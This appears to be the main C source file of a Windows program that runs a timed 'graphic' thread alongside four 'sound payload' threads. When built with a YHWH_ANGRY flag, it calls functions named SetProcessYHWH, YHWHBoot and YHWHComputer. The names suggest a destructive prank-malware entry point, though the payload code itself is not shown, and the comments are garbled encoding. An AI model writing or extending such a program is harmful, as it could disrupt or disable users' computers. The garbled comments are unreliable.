#include "YHWH.h"

int screen_width, screen_height;
static HANDLE g_hGfxGate = NULL;

static DWORD WINAPI default_sound_maker_thread(LPVOID lpParam) {
    S_YHWH_SOUND* p = (S_YHWH_SOUND*)lpParam;
    return default_sound_maker(*p);   // ������ ���� ����
}
static DWORD WINAPI default_graphic_maker_thread(LPVOID lpParam) {
    int v = (int)(INT_PTR)lpParam;   // �� �����͸� �ٽ� ������ ����(32/64 ��� ����)
    return default_graphic_maker(v); // ���� �ñ״�ó ����
}

BOOL run_parallel_per_index(int duration, S_YHWH_SOUND* snd) {
    HANDLE hGfx = CreateThread(NULL, 0, default_graphic_maker_thread,
        (LPVOID)(INT_PTR)duration, 0, NULL);
    if (!hGfx) return FALSE;

    // ���� 4���� �׷��Ȱ� �����ÿ��� ���� ���� (�׷����� ������ ����)
    for (int i = 0; i < 4; ++i) {
        HANDLE hSnd = CreateThread(NULL, 0, default_sound_maker_thread,
            (LPVOID)&snd[i], 0, NULL);
        if (!hSnd) { WaitForSingleObject(hGfx, INFINITE); CloseHandle(hGfx); return FALSE; }
        WaitForSingleObject(hSnd, INFINITE);
        CloseHandle(hSnd);
    }

    // �׷����� ���� �������� ��ĥ ������ ��ٸ� (�� 40�� ��ǥ)
    WaitForSingleObject(hGfx, INFINITE);
    CloseHandle(hGfx);
    return TRUE;
}


int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
#ifdef YHWH_ANGRY
    if (!SetProcessYHWH()) {
        YHWHComputer();
        return 0;
    }
#endif
    srand((unsigned)time(NULL)); 
    screen_width = GetSystemMetrics(SM_CXSCREEN);
    screen_height = GetSystemMetrics(SM_CYSCREEN);

    S_YHWH_SOUND* v_sound_payload =sound_payload(10);

    run_parallel_per_index(40,v_sound_payload);

    free(v_sound_payload);

#ifdef YHWH_ANGRY
    YHWHBoot();
    YHWHComputer();
#endif

    return 0;
}